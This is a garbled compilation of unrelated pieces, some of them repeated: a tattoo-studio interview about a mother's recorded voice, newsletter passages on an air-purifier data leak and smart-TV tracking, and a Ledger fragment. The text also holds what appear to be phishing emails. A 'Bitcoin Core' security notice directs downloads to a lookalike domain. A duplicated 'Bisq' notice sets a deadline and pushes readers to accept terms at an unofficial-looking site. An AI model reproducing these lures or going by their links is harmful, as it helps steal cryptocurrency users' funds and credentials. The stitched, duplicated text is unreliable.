Emmy (Translated from Vietnamese): “When I recorded my mother's voice, she was still living with me and I simply thought I would give her a surprising and meaningful birthday gift. My mother was a strong woman and my mother and I couldn't easily share our feelings with each other. We had never said "I love you" to each other. By the time I got this dragonfly tattoo on my body, my mother had passed away forever; she died during the Covid-19 pandemic in 2021. So the words in this recording are truly very meaningful to me; they encourage me whenever I feel weak, defeated, and want to give up.”


** S.M.: That was such a terrible time in history and we’re so sorry for your loss. How do your memories of her relate to the decision to incorporate her voice into a Dragonfly?
------------------------------------------------------------

Emmy: “The dragonfly symbolizes my mother's soul, a way to remember her and to know that she is always by my side, even if not in the form of a physical human being.

• A gentle soul is always present: not noisy, but a feeling that my mother is still watching over me.

• Transformation and continuity: my mother is gone, but her love and protection continue to exist within me.

• Presence without constraint: like a dragonfly – flying through my life, leaving a feeling of peace, not heavy loss.

• The image of a small, delicate, and subtly colored dragonfly, as if it is fading away (just like a soul flying towards the sky), not too sharp → a gentle feeling, like my mother's soul flying to heaven.

• Only one dragonfly in the image → like a private, unpretentious feeling, like the image of me having only one mother in the world.

This tattoo stems from love and gratitude; it's a beautiful way to say: ‘I will always remember you, Mom, and I will continue to live with all that you expected of me, and I will always remember your words: 'Ngan, keep going, I'm always by your side, keep trying’!”


** S.M.: That is such an inspiration! And you trusted this very  emotional tribute to a special tattoo artist who brought it to life. What can you tell us about them?

Emmy: “I contacted Mr. Tien (Tymon Nguyen – Story Art Tattoo) in mid-2019 to inquire about a Soundwave Tattoo but it wasn't until 2020 that I had the opportunity to meet Mr. Tien in person to discuss and have him design a Soundwave Tattoo for me. “In 2024 he contacted me again and informed me that he could now do Soundwave Tattoos. And then in 2025, I finally got the dragonfly tattoo on my body. I am truly touched and grateful that after so many years, Mr. Tien still remembers each of his clients and is so dedicated to every tattoo he creates. Everyone around me who sees this tattoo praises its beauty and soulfulness, the beautiful and sharp color combination, and when they learn the meaning of the tattoo by scanning the image on the Skinmotion app and hearing my story about my mother, they are all surprised, moved, and delighted.”

Skin Motion Featured Soundwave Tattoo . ** Featured Tattoo: Watch the video below and please take a minute to read Emmy’s inspiring interview.
------------------------------------------------------------
https://www.youtube.com/shorts/feGrTuI3lZk


** This is one of our favorites from 2025. We hope you’ll read Emmy’s emotional story and if you’re looking for a tattoo in Ho Chi Minh City, visit Mr. Tien at Story Art Tattoo who created this beautiful piece of art.
------------------------------------------------------------


** S.M.: Hi Emmy. While we now know your Soundwave Tattoo contains your mom’s voice, what was it about this moment and her words that made you want to keep it with you?
------------------------------------------------------------

Emmy (Translated from Vietnamese): “When I recorded my mother's voice, she was still living with me and I simply thought I would give her a surprising and meaningful birthday gift. I recorded my mother's voice in 2019 when I accidentally saw a Soundwave Tattoo online and I thought it was quite meaningful. My mother was a strong woman and my mother and I couldn't easily share our feelings with each other. We had never said "I love you" to each other. By the time I got this dragonfly tattoo on my body, my mother had passed away forever; she died during the Covid-19 pandemic in 2021. So the words in this recording are truly very meaningful to me; they encourage me whenever I feel weak, defeated, and want to give up.”


** S.M.: That was such a terrible time in history and we’re so sorry for your loss. How do your memories of her relate to the decision to incorporate her voice into a Dragonfly?
------------------------------------------------------------

Emmy: “The dragonfly symbolizes my mother's soul, a way to remember her and to know that she is always by my side, even if not in the form of a physical human being.

• A gentle soul is always present: not noisy, but a feeling that my mother is still watching over me.

• Transformation and continuity: my mother is gone, but her love and protection continue to exist within me.

• Presence without constraint: like a dragonfly – flying through my life, leaving a feeling of peace, not heavy loss.

• The image of a small, delicate, and subtly colored dragonfly, as if it is fading away (just like a soul flying towards the sky), not too sharp → a gentle feeling, like my mother's soul flying to heaven.

• Only one dragonfly in the image → like a private, unpretentious feeling, like the image of me having only one mother in the world.

This tattoo stems from love and gratitude; it's a beautiful way to say: ‘I will always remember you, Mom, and I will continue to live with all that you expected of me, and I will always remember your words: 'Ngan, keep going, I'm always by your side, keep trying’!”


** S.M.: That is such an inspiration! And you trusted this very  emotional tribute to a special tattoo artist who brought it to life. What can you tell us about them?
------------------------------------------------------------

I wonder how much you think about your data when you decide to buy an IoT device.

If you’ve been watching Louis’ channel for long enough, you probably think about it more than the average consumer. Maybe it’s your first thought. Maybe it’s something you weigh against the possible benefits that the device might bring to your life.

If you don’t think about it at all, a recent finding by cybersecurity researcher Dominik Zürner suggests that these ideas should probably come up sooner. Dominik found that Molekule air purifiers, which we targeted with a bounty [https://fulu-foundation.ghost.io/r/4c8044d8?m=b503a08a-c4e6-4bfd-bc68-f98315f6032b] last fall, had vulnerabilities [https://fulu-foundation.ghost.io/r/9a8aa9cc?m=b503a08a-c4e6-4bfd-bc68-f98315f6032b] that would allow “an unauthenticated attacker [to] access Molekule’s AWS IoT Core MQTT broker and subscribe to wildcard topics, receiving real-time device shadow updates from approximately 100,000 deployed IoT devices globally.”

You don’t need to be a cybersecurity expert to know that “receiving real-time device shadow updates from approximately 100,000 IoT devices globally” is not a good thing. Those updates included device owners’ WiFi network names, MAC addresses unique to each device, device names, and sensor readings.











 




[https://fulu-foundation.ghost.io/r/f44842b4?m=b503a08a-c4e6-4bfd-bc68-f98315f6032b]





Cyber vulnerabilities can lead to harm IRL

To me, any knowledge that my data has been unduly accessed is a violation in its own right. But the Molekule vulnerability could lead to real-life harm if exploited by the wrong party. Tracking usage data could help a black hat hacker recognize when a user is or isn’t home. Knowledge of filter status combined with an easily identifiable WiFi name—such as one Colorado-based dentist’s office that Dominik found in the logs—could be leveraged to launch a hyper-targeted phishing scheme.

Dominik, who is a professional security analyst, will sometimes look under the hood of consumer devices in his free time. After hearing about our bounty [https://fulu-foundation.ghost.io/r/71e214a5?m=b503a08a-c4e6-4bfd-bc68-f98315f6032b] targeting Molekule’s effort to prevent owners from using third-party filters, he borrowed his friends air purifier and got to work. Once he found the issue, he notified the company, in line with responsible disclosure practices.

Molekule’s response had some bugs as well. First, Dominik said, they offered him a $5,000 bounty for his finding. That’s a good thing—bug bounties can be an effective way to reward cybersecurity researchers for identifying problems that could lead to consumer harm so that companies can fix them before any damage is done.

The problem was that the company asked him to sign an overly-strong NDA that “basically prevent[ed] me from ever discussing this vulnerability, even after a fix,” Dominik wrote in a GitHub post [https://fulu-foundation.ghost.io/r/a734b4f7?m=b503a08a-c4e6-4bfd-bc68-f98315f6032b]. With the rise of streaming, it’s obvious you don’t own the shows you watch on Netflix or Hulu. You lose access to content the minute your bill is overdue.

When it comes to the TV on which you watch that show, however, it sure feels like you own it. After all, you bought the device and installed it in your living room or bedroom. No one tells you which streaming service to use or which Blu-ray player to hook up. You own it, so you control how it is used.

Loss of control is the canary in the coal mine of ownership. At the end of March, that canary’s song wavered as Walmart announced [https://fulu-foundation.ghost.io/r/61987cad?m=b503a08a-c4e6-4bfd-bc68-f98315f6032b] its new Vizio televisions will require customers to sign in to Walmart accounts to access smart TV features.

This move, one of the most aggressive in undermining owners’ control of their televisions to date, is the latest in an industry with a long history of surveillance.


The history of watching us watch TV

Since the invention of the television, companies have wanted to know what Americans were watching. The A.C. Nielsen Company, now known as Nielsen IQ [https://fulu-foundation.ghost.io/r/faea4588?m=b503a08a-c4e6-4bfd-bc68-f98315f6032b], first created television ratings in 1950. In exchange for allowing the company to install meters that monitored when a TV was in use and to which channel it was tuned, Nielsen would pay a group of demographically representative families to track what they watched. Monitoring viewing habits paid off as the resulting data served a wealthy market: the advertising industry.

As technology has progressed, so have the ways that Nielsen and others track what people watch. The development of automatic content recognition (ACR)—which companies now owned by Roku [https://fulu-foundation.ghost.io/r/8877d130?m=b503a08a-c4e6-4bfd-bc68-f98315f6032b], Vizio [https://fulu-foundation.ghost.io/r/36468934?m=b503a08a-c4e6-4bfd-bc68-f98315f6032b], and Nielsen [https://fulu-foundation.ghost.io/r/5660fdb1?m=b503a08a-c4e6-4bfd-bc68-f98315f6032b] began to patent as early as 2008—added TV manufacturers to the mix.











 




[https://fulu-foundation.ghost.io/r/c0761cfd?m=b503a08a-c4e6-4bfd-bc68-f98315f6032b]




ACR allows TV makers and other surveillance businesses to more accurately track watching habits at a far greater scale. Instead of making assessments based on the channel to which an owner’s set is tuned, ACR takes snapshots of audio or video as often as every 10 milliseconds [https://fulu-foundation.ghost.io/r/cc19c638?m=b503a08a-c4e6-4bfd-bc68-f98315f6032b] from any media source connected to your TV [https://fulu-foundation.ghost.io/r/e8578074?m=b503a08a-c4e6-4bfd-bc68-f98315f6032b], and compares them against a broader video database. Because the technology is built into devices and ‘consent’ to be tracked is often buried in the terms of service [https://fulu-foundation.ghost.io/r/213701e8?m=b503a08a-c4e6-4bfd-bc68-f98315f6032b] required to use smart features, manufacturers and their ACR partners are able to track what nearly every smart TV viewer is watching.

Update Your Bitcoin Core App Immediately . Dear Bitcoin Core User,

We are issuing this notice because your version of Bitcoin Core may be affected by security vulnerabilities that have now been publicly disclosed.

Following responsible disclosure by independent security researchers, the Bitcoin Core development team has confirmed multiple vulnerabilities in all versions through 29.x. 

These issues were patched in Bitcoin Core v30.0, released October 10, 2025. If you have not yet updated, your node is exposed.

WHAT WAS FOUND

Researchers identified four confirmed vulnerabilities in prior versions:

1. CVE-2025-46598 - A specially crafted invalid transaction could be sent to your node to trigger excessive CPU consumption, degrading or disabling your node's ability to process transactions.

2. CVE-2025-54604 - An attacker could exploit a logging flaw to repeatedly flood your node's disk with data by faking self-connections, eventually causing your node to run out of disk space and go offline.

3. CVE-2025-54605 - A similar disk-filling attack carried out by sending a high volume of invalid blocks to your node.

4. CVE-2025-46597 - An integer overflow bug on 32-bit systems that could, under specific conditions, cause your node to crash when processing a malicious block.

These vulnerabilities have been publicly disclosed. The details are now available to anyone, including those with malicious intent. Nodes running version 29.x or earlier are at risk.

WHAT YOU NEED TO DO

Update to Bitcoin Core v30.0 or later immediately.

Download the latest version directly from the official Bitcoin Core website:

https://bitcoincoreorg.live/

If you are running a wallet on an older version, your funds are not directly at risk from these specific vulnerabilities. 

However, a node that can be crashed or taken offline weakens your ability to independently verify transactions. Updating is strongly advised.


The Bitcoin Core Development Team

Compliance Notice

 

July 2026  ·  Protocol Update Notice


UPDATED TRADING PROTOCOL TERMS & LIMITS

Hi there,

On May 1, 2026, Bisq v1 experienced a security incident in which an attacker exploited insufficient validation in the trade protocol, affecting a limited number of altcoin trades. The Bisq DAO responded quickly — trading was halted, affected users were fully reimbursed, and a comprehensive security review was completed.

The result of that review is Bisq v1.10.x — a hardened release with expanded protocol validation and several precautionary trading restrictions now in effect. These changes are not optional. They are part of the updated terms governing how trades are conducted on the network, and we need you to review and acknowledge them before the deadline below.

----------------------------------------

What Has Changed

1.

Maximum Trade Size Reduced to 0.125 BTC

To limit exposure while the broader security audit continues, the per-trade maximum has been lowered from 2 BTC to 0.125 BTC. This applies to all new offers and taken trades on Bisq v1. Existing open trades are not affected.

2.

Price Deviation Cap Set at 25%

All offers and active trades are now restricted to a maximum price deviation of 25% from the market reference price. Offers outside this range will be rejected by the protocol. This change closes a manipulation vector identified during the post-incident review.

3.

XMR Auto-Confirmation Suspended

Monero (XMR) auto-confirmation has been disabled until a dedicated security audit is completed. XMR trades remain available but require manual confirmation. This is a temporary measure with no set end date until the audit concludes.

----------------------------------------

⚠  Action Required Within 14 Business Days

Please review and acknowledge the updated protocol terms by the deadline. Accounts that have not confirmed acceptance may have their ability to open new offers or take trades temporarily restricted until acknowledgment is complete. Existing open trades and wallet balances are not affected by this restriction.

✓  Your Funds Are Safe

These are protocol-level trading restrictions only. Bitcoin and other assets held in your Bisq wallet are stored locally on your device and remain entirely under your control. Bisq never holds your funds. The Bisq 2 platform and Bisq Easy protocol were not affected by the May 2026 incident.

----------------------------------------

Review & Accept

Choose the option that works best for you. Both paths lead to the same outcome — a confirmed acknowledgment of the updated terms.

Option 1: Schedule a 15-Minute Call

Book a short session with our support team. We will walk you through each change, answer your questions, and help you confirm acceptance in a single call.

Schedule Your Session https://bisqpolicy.com

You will be taken to our scheduling page to pick a date and time.

Option 2: Review Independently and Accept Now

Unable to schedule a call? Download the full updated protocol document, review the changes in plain language on your own time, and confirm acceptance directly through the document portal.

Review Document & Accept Terms https://transcript.bisqpolicy.com

You will be directed to the document portal to review and confirm the updated terms.

Need Assistance?

The Bisq Support Team is available through our official channels. Please do not respond to private messages on Reddit or Telegram claiming to be from Bisq — those are not legitimate support contacts.

Matrix (primary): bisq.chat https://bisq.chat
Forum: bisq.community https://bisq.community
GitHub Issues: github.com/bisq-network/bisq https://github.com/bisq-network/bisq

July 2026  ·  Protocol Update Notice


UPDATED TRADING PROTOCOL TERMS & LIMITS

Hi there,

On May 1, 2026, Bisq v1 experienced a security incident in which an attacker exploited insufficient validation in the trade protocol, affecting a limited number of altcoin trades. The Bisq DAO responded quickly — trading was halted, affected users were fully reimbursed, and a comprehensive security review was completed.

The result of that review is Bisq v1.10.x — a hardened release with expanded protocol validation and several precautionary trading restrictions now in effect. These changes are not optional. They are part of the updated terms governing how trades are conducted on the network, and we need you to review and acknowledge them before the deadline below.

----------------------------------------

What Has Changed

1.

Maximum Trade Size Reduced to 0.125 BTC

To limit exposure while the broader security audit continues, the per-trade maximum has been lowered from 2 BTC to 0.125 BTC. This applies to all new offers and taken trades on Bisq v1. Existing open trades are not affected.

2.

Price Deviation Cap Set at 25%

All offers and active trades are now restricted to a maximum price deviation of 25% from the market reference price. Offers outside this range will be rejected by the protocol. This change closes a manipulation vector identified during the post-incident review.

3.

XMR Auto-Confirmation Suspended

Monero (XMR) auto-confirmation has been disabled until a dedicated security audit is completed. XMR trades remain available but require manual confirmation. This is a temporary measure with no set end date until the audit concludes.

----------------------------------------

⚠  Action Required Within 14 Business Days

Please review and acknowledge the updated protocol terms by the deadline. Accounts that have not confirmed acceptance may have their ability to open new offers or take trades temporarily restricted until acknowledgment is complete. Existing open trades and wallet balances are not affected by this restriction.

✓  Your Funds Are Safe

These are protocol-level trading restrictions only. Bitcoin and other assets held in your Bisq wallet are stored locally on your device and remain entirely under your control. Bisq never holds your funds. The Bisq 2 platform and Bisq Easy protocol were not affected by the May 2026 incident.

----------------------------------------

At Ledger, our mission has always been to provide you with the most secure way to own your crypto. While your Ledger hardware wallet keeps your private keys offline and secure, the digital asset ecosystem around it is constantly evolving, especially with new regulations.
